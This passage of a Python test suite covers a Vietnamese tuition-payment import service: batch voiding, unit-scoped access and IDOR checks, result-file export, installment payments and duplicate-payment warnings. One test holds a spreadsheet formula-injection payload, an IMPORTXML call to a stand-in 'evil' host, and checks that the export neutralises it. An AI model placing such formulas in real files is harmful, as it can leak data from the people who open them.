        assert all(i.paid_amount == Decimal("0") and i.status == "issued" for i in invs)
        fee = (
            (await db.execute(select(Fee).where(Fee.fee_type == "tuition")))
            .scalars()
            .first()
        )
        assert fee.paid_amount == Decimal("0") and fee.status == "invoiced"
        revs = (
            (
                await db.execute(
                    select(PaymentTransaction).where(
                        PaymentTransaction.transaction_type == "reversal"
                    )
                )
            )
            .scalars()
            .all()
        )
        assert len(revs) == 2

    async def test_void_blocked_when_refund_exists(
        self, db, seeded_dependencies, admin_user
    ):
        # P1: payment có RefundRequest non-rejected → void REFUSE (chống double-reverse)
        from app.models.finance import RefundRequest

        batch_id = await self._commit_one(db, seeded_dependencies, admin_user.id)
        pay = (await db.execute(select(Payment))).scalars().first()
        db.add(
            RefundRequest(
                payment_id=pay.id, amount=Decimal("5000000"), reason="khách đòi lại",
                requested_by_id=admin_user.id, status="approved",
            )
        )
        await db.commit()
        with pytest.raises(ConflictError):
            await pis.void_batch(
                db, batch_id=batch_id, user_id=admin_user.id, unit_id=None, reason="x"
            )
        b = (
            await db.execute(
                select(PaymentImportBatch).where(PaymentImportBatch.id == batch_id)
            )
        ).scalar_one()
        assert b.status == "committed"  # KHÔNG bị void

    async def test_void_blocked_when_fee_cancelled(
        self, db, seeded_dependencies, admin_user
    ):
        # #3: fee bị hủy out-of-band giữa commit→void → refuse (không resurrect)
        batch_id = await self._commit_one(db, seeded_dependencies, admin_user.id)
        fee = (
            (await db.execute(select(Fee).where(Fee.fee_type == "tuition")))
            .scalars()
            .first()
        )
        fee.status = "cancelled"
        await db.commit()
        with pytest.raises(BusinessRuleViolation):
            await pis.void_batch(
                db, batch_id=batch_id, user_id=admin_user.id, unit_id=None, reason="x"
            )


class TestListBatches:
    async def test_unit_scope(self, db, seeded_dependencies, second_unit, officer_user):
        # P1 #2: list lô unit-scope theo đơn vị người tạo.
        from app.security import get_password_hash

        u2001 = models.User(
            username="fin2001",
            email="fin2001@test.com",
            password_hash=get_password_hash("X123!"),
            role="accountant",
            status="active",
            unit_id=second_unit.id,
        )
        db.add(u2001)
        await db.flush()
        for created_by in (officer_user.id, u2001.id):
            db.add(
                PaymentImportBatch(
                    academic_year=2026,
                    semester_no=1,
                    file_name="f.csv",
                    file_sha256=f"{created_by:064d}",
                    status="preview",
                    created_by_id=created_by,
                )
            )
        await db.flush()

        items_a, total_a = await pis.list_batches(
            db, unit_id=seeded_dependencies["unit_id"]
        )
        assert total_a == 1
        assert items_a[0].created_by_id == officer_user.id

        items_all, total_all = await pis.list_batches(db, unit_id=None)
        assert total_all == 2


# =============================================================================
# BV-5 R2/R1 — build_result_file + get_batch_detail_scoped
# =============================================================================
_sha_seq = iter(range(10000, 99999))


async def _mk_user(db, *, username, unit_id, role="accountant"):
    from app.security import get_password_hash

    u = models.User(
        username=username,
        email=f"{username}@t.local",
        password_hash=get_password_hash("X123!abcd"),
        full_name=username,
        role=role,
        status="active",
        unit_id=unit_id,
    )
    db.add(u)
    await db.flush()
    return u


async def _mk_batch_with_row(
    db, *, creator_id, status, raw, row_status="matched", payment_ids=None,
    amount="1000000", resolved_profile_id=None,
):
    batch = PaymentImportBatch(
        academic_year=2026,
        semester_no=1,
        file_name="x.xlsx",
        file_sha256=f"sha-{next(_sha_seq)}",
        status=status,
        row_count=1,
        matched_count=1 if row_status != ERROR else 0,
        warned_count=0,
        failed_count=1 if row_status == ERROR else 0,
        total_amount=Decimal(amount),
        created_by_id=creator_id,
    )
    db.add(batch)
    await db.flush()
    row = PaymentImportRow(
        batch_id=batch.id,
        row_no=2,
        citizen_id="001234567890",
        raw=raw,
        status=row_status,
        amount=Decimal(amount),
        message="",
        payment_ids=payment_ids or [],
        resolved_profile_id=resolved_profile_id,
    )
    db.add(row)
    await db.flush()
    return batch


class TestResultFileAndDetail:
    async def test_build_result_file_sanitizes_formula_injection(
        self, db, seeded_dependencies, admin_user
    ):
        # 🔴 P1: ô raw mở đầu '=' (=IMPORTXML) PHẢI ra TEXT ('=...) trong file kết quả,
        # KHÔNG để openpyxl/Excel diễn giải thành công thức.
        evil = '=IMPORTXML("http://evil/x","//a")'
        batch = await _mk_batch_with_row(
            db,
            creator_id=admin_user.id,
            status="committed",
            raw={pis.COL_CCCD: "001234567890", pis.COL_NAME: evil},
            payment_ids=[101],
        )
        content, media, fname = await pis.build_result_file(db, batch.id, "csv", None)
        text = content.decode("utf-8")
        # sanitize = prepend ' (CSV escape inner quotes "→"" nên chỉ check prefix).
        assert "'=IMPORTXML" in text  # đã thành TEXT, không phải =IMPORTXML sống
        assert ",=IMPORTXML" not in text  # KHÔNG có công thức sống ở đầu field
        assert fname.endswith(".csv")
        assert "Đã ghi" in text  # nhãn committed

    async def test_build_result_file_xlsx_no_live_formula(
        self, db, seeded_dependencies, admin_user
    ):
        from openpyxl import load_workbook

        batch = await _mk_batch_with_row(
            db,
            creator_id=admin_user.id,
            status="committed",
            raw={pis.COL_CCCD: "001234567890", pis.COL_NAME: "=1+1"},
            payment_ids=[101],
        )
        content, _, fname = await pis.build_result_file(db, batch.id, "xlsx", None)
        assert fname.endswith(".xlsx")
        wb = load_workbook(io.BytesIO(content))
        ws = wb.active
        # KHÔNG có ô nào là công thức sống (data_type 'f').
        for row in ws.iter_rows():
            for c in row:
                assert c.data_type != "f", f"ô {c.coordinate} là formula sống!"

    async def test_build_result_file_void_labels_da_dao_not_thanh_cong(
        self, db, seeded_dependencies, admin_user
    ):
        # 🔴 P2: lô VOID → nhãn "Đã đảo" (tiền đã rút lại), KHÔNG "Thành công".
        batch = await _mk_batch_with_row(
            db,
            creator_id=admin_user.id,
            status="void",
            raw={pis.COL_CCCD: "001234567890", pis.COL_NAME: "Nguyễn Văn A"},
            payment_ids=[101],
        )
        content, _, _ = await pis.build_result_file(db, batch.id, "csv", None)
        text = content.decode("utf-8")
        assert "Đã đảo" in text
        assert "Thành công" not in text

    async def test_get_batch_detail_scoped_idor(self, db, seeded_dependencies):
        # IDOR: lô do user unit 1001 tạo → manager unit 2002 KHÔNG xem được (404).
        creator = await _mk_user(db, username="acc1001", unit_id=1001)
        batch = await _mk_batch_with_row(
            db,
            creator_id=creator.id,
            status="committed",
            raw={pis.COL_CCCD: "001234567890"},
        )
        # khác đơn vị → ResourceNotFoundError
        with pytest.raises(pis.ResourceNotFoundError):
            await pis.get_batch_detail_scoped(db, batch.id, unit_id=2002)
        # cùng đơn vị → OK
        b, rows = await pis.get_batch_detail_scoped(db, batch.id, unit_id=1001)
        assert b.id == batch.id and len(rows) == 1
        # admin (None) → OK
        b2, _ = await pis.get_batch_detail_scoped(db, batch.id, unit_id=None)
        assert b2.id == batch.id

    async def test_get_batch_detail_scoped_not_found(self, db, seeded_dependencies):
        with pytest.raises(pis.ResourceNotFoundError):
            await pis.get_batch_detail_scoped(db, 999999, unit_id=None)

    async def test_build_result_file_written_amount_no_trailing_cents(
        self, db, seeded_dependencies, admin_user
    ):
        # Review #9: cột "Đã ghi (đồng)" = VND nguyên (KHÔNG đuôi '.00' của
        # Numeric(15,2)).
        batch = await _mk_batch_with_row(
            db,
            creator_id=admin_user.id,
            status="committed",
            raw={pis.COL_CCCD: "001234567890"},
            row_status="matched",
            payment_ids=[101],
            amount="1000000",
        )
        content, _, _ = await pis.build_result_file(db, batch.id, "csv", None)
        text = content.decode("utf-8")
        assert "1000000" in text
        assert "1000000.00" not in text  # không lọt đuôi .00

    async def test_build_result_file_committed_error_label(
        self, db, seeded_dependencies, admin_user
    ):
        # Review #10: lô committed + dòng ERROR (TOCTOU) → nhãn "Lỗi (không ghi)",
        # KHÔNG "Đã ghi" (chống lừa P2 cho nhánh error).
        batch = await _mk_batch_with_row(
            db,
            creator_id=admin_user.id,
            status="committed",
            raw={pis.COL_CCCD: "001234567890"},
            row_status="error",
            payment_ids=[],
            amount="1000000",
        )
        content, _, _ = await pis.build_result_file(db, batch.id, "csv", None)
        text = content.decode("utf-8")
        assert "Lỗi (không ghi)" in text

    async def test_includes_profile_name_column_after_student_name(
        self, db, seeded_dependencies, admin_user
    ):
        # Cột "Tên hồ sơ" (tên hệ thống) chèn NGAY SAU "Họ và tên học sinh" để đối
        # chiếu.
        profile, _, _ = await _seed_tuition(
            db,
            seeded_dependencies,
            citizen_id="012345678901",
            invoices=[(1, 1000000, "issued", 0, 0)],
            lead_name="Nguyễn Thị Hồng",
        )
        batch = await _mk_batch_with_row(
            db,
            creator_id=admin_user.id,
            status="committed",
            raw={pis.COL_CCCD: "012345678901", pis.COL_NAME: "Nguyen Thi Hong"},
            payment_ids=[101],
            resolved_profile_id=profile.id,
        )
        content, _, _ = await pis.build_result_file(db, batch.id, "csv", None)
        text = content.decode("utf-8")
        header = text.splitlines()[0].lstrip("﻿").split(",")
        assert pis.COL_PROFILE_NAME in header
        assert header.index(pis.COL_PROFILE_NAME) == header.index(pis.COL_NAME) + 1
        # tên hệ thống (có dấu) xuất hiện — khác tên file ghi không dấu
        assert "Nguyễn Thị Hồng" in text

    async def test_profile_name_placeholder_when_unresolved(
        self, db, seeded_dependencies, admin_user
    ):
        # Dòng không resolve được hồ sơ → cột "Tên hồ sơ" = "(không có hồ sơ)".
        batch = await _mk_batch_with_row(
            db,
            creator_id=admin_user.id,
            status="preview",
            raw={pis.COL_CCCD: "999999999999", pis.COL_NAME: "Vô Danh"},
            row_status="error",
            payment_ids=[],
            resolved_profile_id=None,
        )
        content, _, _ = await pis.build_result_file(db, batch.id, "csv", None)
        text = content.decode("utf-8")
        assert "(không có hồ sơ)" in text


# =============================================================================
# Diễn tiến: kế toán thu nhiều lần + import nhiều lô cho 1 hồ sơ (kịch bản 06-25)
# =============================================================================
class TestMultiCollectionTimeline:
    """Mô phỏng đúng diễn biến nghiệp vụ đã chốt: học phí HK1 chia 2 đợt (đợt 1
    đã phát hành, đợt 2 còn nháp). Kế toán thu 3 lần → import 3 lô; lô tràn sang
    đợt CHƯA phát hành bị chặn cho tới khi phát hành hóa đơn đợt đó."""

    @pytest.fixture(autouse=True)
    async def _infra(self, db):
        await _seed_system_user(db)
        await _seed_cash_method(db)

    @staticmethod
    def _file(amount: str) -> bytes:
        return _csv_bytes(
            [
                pis.TEMPLATE_COLS,
                ["012345678901", "Nguyễn Văn A", amount, "05/09/2026", "TM", "", ""],
            ]
        )

    async def _import_commit(self, db, admin_id, amount):
        batch, preview = await pis.preview_import(
            db,
            content=self._file(amount),
            filename=f"thu_{amount}.csv",
            academic_year=2026,
            semester_no=1,
            created_by_id=admin_id,
            unit_id=None,
        )
        await db.commit()
        result, _ = await pis.commit_batch(
            db, batch_id=batch.id, importer_id=admin_id, unit_id=None
        )
        await db.commit()
        return batch, preview, result

    async def test_full_timeline_multi_collect_multi_import(
        self, db, seeded_dependencies, admin_user
    ):
        # --- Thiết lập: HK1 = 10tr = đợt1 6tr (issued) + đợt2 4tr (draft, CHƯA p.hành)
        _profile, _fee, invs = await _seed_tuition(
            db,
            seeded_dependencies,
            citizen_id="012345678901",
            lead_name="Nguyễn Văn A",
            invoices=[
                (1, "6000000", "issued", "0", "0"),
                (2, "4000000", "draft", "0", "0"),
            ],
        )
        inv1_id, inv2_id, fee_id = invs[0].id, invs[1].id, _fee.id
        await db.commit()

        async def _state():
            i1 = (
                await db.execute(select(Invoice).where(Invoice.id == inv1_id))
            ).scalar_one()
            i2 = (
                await db.execute(select(Invoice).where(Invoice.id == inv2_id))
            ).scalar_one()
            f = (
                await db.execute(select(Fee).where(Fee.id == fee_id))
            ).scalar_one()
            return i1, i2, f

        # === Lô #1: thu 3.5tr → vào đợt 1 (issued) ===
        _, _, r1 = await self._import_commit(db, admin_user.id, "3.500.000")
        assert r1.committed_count == 1 and r1.payment_count == 1
        i1, i2, f = await _state()
        assert i1.paid_amount == Decimal("3500000") and i1.status == "partial"
        assert i2.status == "draft"  # đợt 2 vẫn nháp
        assert f.paid_amount == Decimal("3500000")

        # === Lô #2: thu 2.5tr → đóng nốt đợt 1 ===
        _, _, r2 = await self._import_commit(db, admin_user.id, "2.500.000")
        assert r2.committed_count == 1
        i1, i2, f = await _state()
        assert i1.paid_amount == Decimal("6000000") and i1.status == "paid"
        assert f.paid_amount == Decimal("6000000")

        # === Lô #3 (lần 1): thu 4tr — đợt 1 đã 'paid', đợt 2 còn 'draft' → KHÔNG có
        #     hóa đơn payable → LỖI message 'đợt còn nháp' (KHÔNG ghi tiền) ===
        batch3, preview3 = await pis.preview_import(
            db,
            content=self._file("4.000.000"),
            filename="thu_4.000.000.csv",
            academic_year=2026,
            semester_no=1,
            created_by_id=admin_user.id,
            unit_id=None,
        )
        await db.commit()
        assert preview3.rows[0].status == ERROR
        assert "đợt còn nháp" in preview3.rows[0].message
        _, _, f = await _state()
        assert f.paid_amount == Decimal("6000000")  # chưa ghi thêm

        # === Kế toán PHÁT HÀNH đợt 2 (draft → issued) ===
        i2_lock = (
            await db.execute(select(Invoice).where(Invoice.id == inv2_id))
        ).scalar_one()
        i2_lock.status = "issued"
        await db.commit()

        # === Lô #3 (lần 2): re-import CÙNG file 4tr → preview cũ bị THAY (replace) →
        #     đợt 2 nay 'issued' → Khớp → commit → đóng đủ HK1 ===
        _, preview3b, r3 = await self._import_commit(db, admin_user.id, "4.000.000")
        assert preview3b.rows[0].status in (MATCHED, WARNED)
        assert r3.committed_count == 1 and r3.payment_count == 1
        i1, i2, f = await _state()
        assert i2.paid_amount == Decimal("4000000") and i2.status == "paid"
        assert f.paid_amount == Decimal("10000000") and f.status == "paid"

        # Tổng 3 lô = 3 Payment = 10tr
        pays = (await db.execute(select(Payment))).scalars().all()
        assert len(pays) == 3
        assert sum((p.amount for p in pays), Decimal("0")) == Decimal("10000000")

    async def test_overpay_blocked_when_next_installment_not_issued(
        self, db, seeded_dependencies, admin_user
    ):
        # Biên: đợt 1 còn 2.5tr, đợt 2 còn 'draft' → thu 5tr KHÔNG tràn sang đợt 2
        # (đợt nháp không tính nợ khả thu) → LỖI 'vượt còn nợ gốc'.
        await _seed_tuition(
            db,
            seeded_dependencies,
            citizen_id="012345678901",
            lead_name="Nguyễn Văn A",
            invoices=[
                (1, "6000000", "partial", "3500000", "0"),
                (2, "4000000", "draft", "0", "0"),
            ],
        )
        res = await pis.resolve_and_validate(
            db, [_draft("012345678901", "5000000")], 2026, 1, None
        )
        assert res.rows[0].status == ERROR
        assert "vượt" in res.rows[0].message

    async def test_overflow_two_issued_installments_warns(
        self, db, seeded_dependencies, admin_user
    ):
        # Đối chứng: nếu đợt 2 ĐÃ phát hành (issued), thu 5tr tràn 2 đợt → WARNED
        # (cảnh báo tràn nhiều đợt) — ghi được (khác hẳn ca đợt nháp ở trên).
        await _seed_tuition(
            db,
            seeded_dependencies,
            citizen_id="012345678901",
            lead_name="Nguyễn Văn A",
            invoices=[
                (1, "6000000", "partial", "3500000", "0"),
                (2, "4000000", "issued", "0", "0"),
            ],
        )
        res = await pis.resolve_and_validate(
            db, [_draft("012345678901", "5000000")], 2026, 1, None
        )
        assert res.rows[0].status == WARNED
        assert len(res.rows[0].allocations) == 2  # 2.5tr đợt1 + 2.5tr đợt2


# =============================================================================
# #4 — void lead-level: giữ sts10 khi lead còn HK1 settled ở hồ sơ/năm KHÁC
# =============================================================================
class TestLeadHasOtherSettledHk1:
    """Audit 2026-06-29 #4 — ``_lead_has_other_settled_hk1`` (chống tụt nhãn
    lead khỏi sts10 oan khi void 1 fee HK1 của lead multi-profile/multi-year)."""

    async def _two_profile_lead(self, db, deps):
        lead = models.Lead(
            full_name="Multi Hồ Sơ",
            phone=f"09{next(_phone_seq):08d}",
            source="bulk_test",
            unit_id=deps["unit_id"],
            consultation_status_id=deps["initial_status_id"],
        )
        db.add(lead)
        await db.flush()
        out = []
        for yr in (2025, 2026):
            prof = models.AdmissionProfile(
                lead_id=lead.id, status="submitted", academic_year=yr, applied_rules={},
            )
            db.add(prof)
            await db.flush()
            fee = Fee(
                admission_profile_id=prof.id, fee_type="tuition", academic_year=yr,
                semester_no=1, base_amount=Decimal("7000000"),
                final_amount=Decimal("7000000"), paid_amount=Decimal("7000000"),
                status="paid",
            )
            db.add(fee)
            await db.flush()
            out.append((prof, fee))
        return out

    async def test_other_settled_hk1_keeps_sts10(self, db, seeded_dependencies):
        """Void feeB → feeA (HK1, paid, hồ sơ khác) vẫn settled → True (giữ sts10)."""
        (profA, feeA), (profB, feeB) = await self._two_profile_lead(
            db, seeded_dependencies
        )
        assert await pis._lead_has_other_settled_hk1(db, profB.id, {feeB.id}) is True

    async def test_no_other_settled_when_all_excluded(self, db, seeded_dependencies):
        """Void CẢ HAI → không còn HK1 settled khác → False (cho phép lùi lead)."""
        (profA, feeA), (profB, feeB) = await self._two_profile_lead(
            db, seeded_dependencies
        )
        assert (
            await pis._lead_has_other_settled_hk1(db, profB.id, {feeA.id, feeB.id})
            is False
        )

    async def test_cancelled_other_fee_not_counted(self, db, seeded_dependencies):
        """feeA cancelled → KHÔNG tính là settled → False."""
        (profA, feeA), (profB, feeB) = await self._two_profile_lead(
            db, seeded_dependencies
        )
        feeA.status = "cancelled"
        await db.flush()
        assert await pis._lead_has_other_settled_hk1(db, profB.id, {feeB.id}) is False


# =============================================================================
# #6 — cảnh báo mềm nghi TRÙNG GIAO DỊCH khi re-import (cùng hồ sơ+ref+số tiền)
# =============================================================================
class TestDuplicateTransactionWarning:
    """Audit 2026-06-29 #6 — re-import sao kê chồng ngày (cùng Mã tham chiếu +
    số tiền cho hồ sơ CÒN NỢ) → preview WARNED (không chặn). Thu góp KHÁC số
    tiền cùng ref → KHÔNG cảnh báo."""

    async def _commit_partial(self, db, deps, admin_user, *, cccd, ref, amount):
        """Seed hồ sơ + HĐ issued 10tr, import 1 dòng (ref, amount) rồi commit →
        có Payment verified(ref, amount); HĐ còn nợ (partial)."""
        await _seed_system_user(db)
        await _seed_cash_method(db)
        await _seed_tuition(
            db, deps, citizen_id=cccd, lead_name="Re Import",
            invoices=[(1, "10000000", "issued", "0", "0")],
        )
        content = _csv_bytes([
            pis.TEMPLATE_COLS,
            [cccd, "Re Import", amount, "05/09/2026", "TM", ref, ""],
        ])
        batch, _ = await pis.preview_import(
            db, content=content, filename="dot1.csv", academic_year=2026,
            semester_no=1, created_by_id=admin_user.id, unit_id=None,
        )
        bid = batch.id
        await db.commit()
        await pis.commit_batch(db, batch_id=bid, importer_id=admin_user.id, unit_id=None)
        await db.commit()

    async def test_reimport_same_ref_amount_warns(
        self, db, seeded_dependencies, admin_user
    ):
        cccd = "077200000001"
        # Commit 4tr (HĐ 10tr → còn nợ 6tr). Re-import CÙNG ref + CÙNG 4tr: 4tr ≤
        # 6tr còn nợ → KHÔNG dính guard "vượt nợ gốc" → tới dup-check → nghi trùng.
        # (Re-import > nợ còn lại thì guard nợ-gốc đã chặn rồi.)
        await self._commit_partial(
            db, seeded_dependencies, admin_user, cccd=cccd, ref="PT-DUP-1", amount="4.000.000"
        )
        res = await pis.resolve_and_validate(
            db, [_draft(cccd, "4000000", reference="PT-DUP-1")], 2026, 1, None
        )
        assert res.rows[0].status == WARNED, res.rows[0].message
        assert "nghi trùng giao dịch" in res.rows[0].message, res.rows[0].message

    async def test_legit_partial_different_amount_no_dup_warn(
        self, db, seeded_dependencies, admin_user
    ):
        cccd = "077200000002"
        # Commit 4tr (còn nợ 6tr). Thu góp tiếp 5tr (cùng ref nhưng KHÁC số tiền,
        # 5tr ≤ 6tr) → tới dup-check nhưng tổng đã ghi 4tr ≠ 5tr → KHÔNG cảnh báo.
        await self._commit_partial(
            db, seeded_dependencies, admin_user, cccd=cccd, ref="PT-DUP-1", amount="4.000.000"
        )
        res = await pis.resolve_and_validate(
            db, [_draft(cccd, "5000000", reference="PT-DUP-1")], 2026, 1, None
        )
        assert "nghi trùng giao dịch" not in (res.rows[0].message or ""), res.rows[0].message


class TestCanhBaoNghiTrungOXemTruoc:
    """B3 — xem trước phải nói ra khi một dòng trùng phiếu ĐÃ GHI.

    Luật theo mã tham chiếu có sẵn chỉ bắt được khi mã KHỚP. Góc nó không thấy,
    và cũng là hình dạng thật của một tệp bị nhập hai lần sau khi ai đó sửa cột
    mã: cùng khoản phí, cùng số tiền, gần ngày, mã khác nhau.
    """

    @pytest.fixture(autouse=True)
    async def _methods(self, db):
        await _seed_cash_method(db)

    async def _ghi_mot_phieu(self, db, invoice, *, amount, when, ref, user_id):
        from app.models.finance import Payment, PaymentMethod, PaymentStatusEnum
        method = (
            await db.execute(select(PaymentMethod).where(PaymentMethod.code == "cash"))
        ).scalars().first()
        db.add(
            Payment(
                invoice_id=invoice.id,
                method_id=method.id,
                amount=amount,
                reference_code=ref,
                status=PaymentStatusEnum.verified.value,
                payment_date=when,
                created_by_id=user_id,
            )
        )
        await db.flush()

    async def test_ma_tham_chieu_KHAC_nhau_van_bi_canh_bao(self, db, seeded_dependencies, admin_user):
        """Ca chính: đây là lỗ hổng mà luật theo mã tham chiếu để lọt."""
        _, fee, invs = await _seed_tuition(
            db,
            seeded_dependencies,
            citizen_id="001234567890",
            invoices=[(1, "10000000", "issued", "0", "0")],
        )
        await self._ghi_mot_phieu(
            db, invs[0],
            amount=Decimal("5000000"),
            when=datetime(2026, 8, 5, tzinfo=timezone.utc),
            ref="UNC-111",
            user_id=admin_user.id,
        )
        res = await pis.resolve_and_validate(
            db,
            [_draft("001234567890", "5000000", reference="UNC-222",
                    payment_date=date(2026, 8, 6))],
            2026, 1, None,
        )
        row = res.rows[0]
        assert row.status == WARNED
        assert "nghi trùng với 1 phiếu đã ghi" in row.message

    async def test_ngoai_cua_so_ngay_thi_khong_canh_bao(self, db, seeded_dependencies, admin_user):
        _, fee, invs = await _seed_tuition(
            db,
            seeded_dependencies,
            citizen_id="001234567890",
            invoices=[(1, "10000000", "issued", "0", "0")],
        )
        await self._ghi_mot_phieu(
            db, invs[0],
            amount=Decimal("5000000"),
            when=datetime(2026, 8, 1, tzinfo=timezone.utc),
            ref="UNC-111",
            user_id=admin_user.id,
        )
        res = await pis.resolve_and_validate(
            db,
            [_draft("001234567890", "5000000", reference="UNC-222",
                    payment_date=date(2026, 8, 20))],
            2026, 1, None,
        )
        assert res.rows[0].status == MATCHED

    async def test_khac_so_tien_thi_khong_canh_bao(self, db, seeded_dependencies, admin_user):
        """Thu góp hợp lệ khác số tiền — cảnh báo ở đây là cảnh báo oan."""
        _, fee, invs = await _seed_tuition(
            db,
            seeded_dependencies,
            citizen_id="001234567890",
            invoices=[(1, "10000000", "issued", "0", "0")],
        )
        await self._ghi_mot_phieu(
            db, invs[0],
            amount=Decimal("5000000"),
            when=datetime(2026, 8, 5, tzinfo=timezone.utc),
            ref="UNC-111",
            user_id=admin_user.id,
        )
        res = await pis.resolve_and_validate(
            db,
            [_draft("001234567890", "3000000", reference="UNC-222",
                    payment_date=date(2026, 8, 6))],
            2026, 1, None,
        )
        assert res.rows[0].status == MATCHED

    async def test_khong_bao_HAI_LAN_khi_luat_ma_tham_chieu_da_bao(
        self, db, seeded_dependencies, admin_user
    ):
        """Cùng một nghi ngờ mà nói hai câu thì kế toán đọc lướt cả hai."""
        _, fee, invs = await _seed_tuition(
            db,
            seeded_dependencies,
            citizen_id="001234567890",
            invoices=[(1, "10000000", "issued", "0", "0")],
        )
        await self._ghi_mot_phieu(
            db, invs[0],
            amount=Decimal("5000000"),
            when=datetime(2026, 8, 5, tzinfo=timezone.utc),
            ref="UNC-111",
            user_id=admin_user.id,
        )
        res = await pis.resolve_and_validate(
            db,
            [_draft("001234567890", "5000000", reference="UNC-111",
                    payment_date=date(2026, 8, 6))],
            2026, 1, None,
        )
        row = res.rows[0]
        assert row.status == WARNED
        assert "mã tham chiếu" in row.message
        assert "nghi trùng với" not in row.message

    async def test_dong_LOI_khong_bi_ha_thanh_canh_bao(self, db, seeded_dependencies):
        """Dòng đang lỗi thì lỗi mới là việc phải xử trước — đừng che nó."""
        res = await pis.resolve_and_validate(
            db,
            [_draft("009999999999", "5000000", payment_date=date(2026, 8, 6))],
            2026, 1, None,
        )
        assert res.rows[0].status == ERROR

    async def test_cau_canh_bao_noi_dung_con_so_cua_so(self, db, seeded_dependencies, admin_user):
        """Câu chữ phải lấy từ hằng, không viết tay '3 ngày'."""
        from app.repositories.payment_repository import WINDOW_DO_TRUNG_NGAY
        _, fee, invs = await _seed_tuition(
            db,
            seeded_dependencies,
            citizen_id="001234567890",
            invoices=[(1, "10000000", "issued", "0", "0")],
        )
        await self._ghi_mot_phieu(
            db, invs[0],
            amount=Decimal("5000000"),
            when=datetime(2026, 8, 5, tzinfo=timezone.utc),
            ref="UNC-111",
            user_id=admin_user.id,
        )
        res = await pis.resolve_and_validate(
            db,
            [_draft("001234567890", "5000000", reference="UNC-222",
                    payment_date=date(2026, 8, 6))],
            2026, 1, None,
        )
        assert f"{WINDOW_DO_TRUNG_NGAY} ngày" in res.rows[0].message


class TestHangRaoTrungOBuocGhi:
    """B3 — bước GHI phải từ chối dòng nghi trùng, và chỉ dòng đó.

    Kịch bản thật: đã có một phiếu chờ duyệt cho khoản phí này (nên mọi màn hình
    vẫn hiện "chưa thu" vì ``paid_amount`` chỉ tăng khi duyệt), rồi kế toán nhập
    tệp có đúng khoản đó.
    """

    async def _phieu_cho_duyet(self, db, *, amount, when, user_id):
        from app.models.finance import Payment, PaymentMethod, PaymentStatusEnum
        method = (
            await db.execute(select(PaymentMethod).where(PaymentMethod.code == "cash"))
        ).scalars().first()
        inv = (await db.execute(select(Invoice))).scalars().first()
        db.add(
            Payment(
                invoice_id=inv.id,
                method_id=method.id,
                amount=amount,
                reference_code="UNC-CU",
                status=PaymentStatusEnum.pending.value,
                payment_date=when,
                created_by_id=user_id,
            )
        )
        await db.flush()

    async def test_dong_nghi_trung_bi_bo_qua_khong_ghi_tien(
        self, db, seeded_dependencies, admin_user
    ):
        await _seed_system_user(db)
        await _seed_cash_method(db)
        batch = await _preview_batch(db, seeded_dependencies, importer_id=admin_user.id)
        batch_id = batch.id
        await self._phieu_cho_duyet(
            db,
            amount=Decimal("10000000"),
            when=datetime(2026, 9, 5, tzinfo=timezone.utc),
            user_id=admin_user.id,
        )
        await db.commit()

        result, _cb = await pis.commit_batch(
            db, batch_id=batch_id, importer_id=admin_user.id, unit_id=None
        )
        await db.commit()

        assert result.committed_count == 0
        assert result.failed_count == 1
        assert result.payment_count == 0
        # Đúng MỘT phiếu trong hệ thống: phiếu chờ duyệt có từ trước.
        assert len((await db.execute(select(Payment))).scalars().all()) == 1

        row = (
            await db.execute(
                select(PaymentImportRow).where(PaymentImportRow.batch_id == batch_id)
            )
        ).scalars().first()
        assert "nghi trùng" in (row.message or "")

    async def test_xac_nhan_ca_lo_thi_ghi_duoc(
        self, db, seeded_dependencies, admin_user
    ):
        await _seed_system_user(db)
        await _seed_cash_method(db)
        batch = await _preview_batch(db, seeded_dependencies, importer_id=admin_user.id)
        batch_id = batch.id
        await self._phieu_cho_duyet(
            db,
            amount=Decimal("10000000"),
            when=datetime(2026, 9, 5, tzinfo=timezone.utc),
            user_id=admin_user.id,
        )
        await db.commit()

        result, _cb = await pis.commit_batch(
            db,
            batch_id=batch_id,
            importer_id=admin_user.id,
            unit_id=None,
            confirm_duplicates=True,
        )
        await db.commit()

        assert result.committed_count == 1
        assert result.payment_count == 1
        # Hai phiếu: cái chờ duyệt cũ + cái vừa ghi.
        assert len((await db.execute(select(Payment))).scalars().all()) == 2

    async def test_khong_nghi_trung_thi_van_ghi_binh_thuong(
        self, db, seeded_dependencies, admin_user
    ):
        """Hàng rào không được chặn nhầm lô sạch — ca giữ cho nó không quá tay."""
        await _seed_system_user(db)
        await _seed_cash_method(db)
        batch = await _preview_batch(db, seeded_dependencies, importer_id=admin_user.id)
        batch_id = batch.id
        await db.commit()

        result, _cb = await pis.commit_batch(
            db, batch_id=batch_id, importer_id=admin_user.id, unit_id=None
        )
        await db.commit()
        assert result.committed_count == 1 and result.payment_count == 1


class TestSuaSauCodeReview:
    """Ba lỗ hổng do rà soát chỉ ra, đều thuộc nhóm 'tiền kẹt ngoài hệ thống'."""

    async def _phieu_cho_duyet(self, db, *, amount, when, user_id):
        from app.models.finance import Payment, PaymentMethod, PaymentStatusEnum
        method = (
            await db.execute(select(PaymentMethod).where(PaymentMethod.code == "cash"))
        ).scalars().first()
        inv = (await db.execute(select(Invoice))).scalars().first()
        db.add(
            Payment(
                invoice_id=inv.id,
                method_id=method.id,
                amount=amount,
                reference_code="UNC-CU",
                status=PaymentStatusEnum.pending.value,
                payment_date=when,
                created_by_id=user_id,
            )
        )
        await db.flush()

    async def test_lo_con_dong_bi_chan_thi_KHONG_dong_lai(
        self, db, seeded_dependencies, admin_user
    ):
        """Đóng lô ở đây là dựng ngõ cụt: lô committed từ chối commit lại (409),
        nên dòng bị giữ vĩnh viễn không vào được — mà đó là tiền đã thu thật."""
        await _seed_system_user(db)
        await _seed_cash_method(db)
        batch = await _preview_batch(db, seeded_dependencies, importer_id=admin_user.id)
        batch_id = batch.id
        await self._phieu_cho_duyet(
            db,
            amount=Decimal("10000000"),
            when=datetime(2026, 9, 5, tzinfo=timezone.utc),
            user_id=admin_user.id,
        )
        await db.commit()

        await pis.commit_batch(
            db, batch_id=batch_id, importer_id=admin_user.id, unit_id=None
        )
        await db.commit()

        b = (
            await db.execute(
                select(PaymentImportBatch).where(PaymentImportBatch.id == batch_id)
            )
        ).scalar_one()
        assert b.status == "preview", "lô còn dòng nghi trùng mà đã bị đóng"

        # …và chính vì còn 'preview' nên lượt gửi lại với xác nhận mới cứu được.
        result2, _ = await pis.commit_batch(
            db,
            batch_id=batch_id,
            importer_id=admin_user.id,
            unit_id=None,
            confirm_duplicates=True,
        )
        await db.commit()
        assert result2.committed_count == 1

    async def test_hai_dong_giong_HET_nhau_trong_MOT_lo_deu_ghi_duoc(
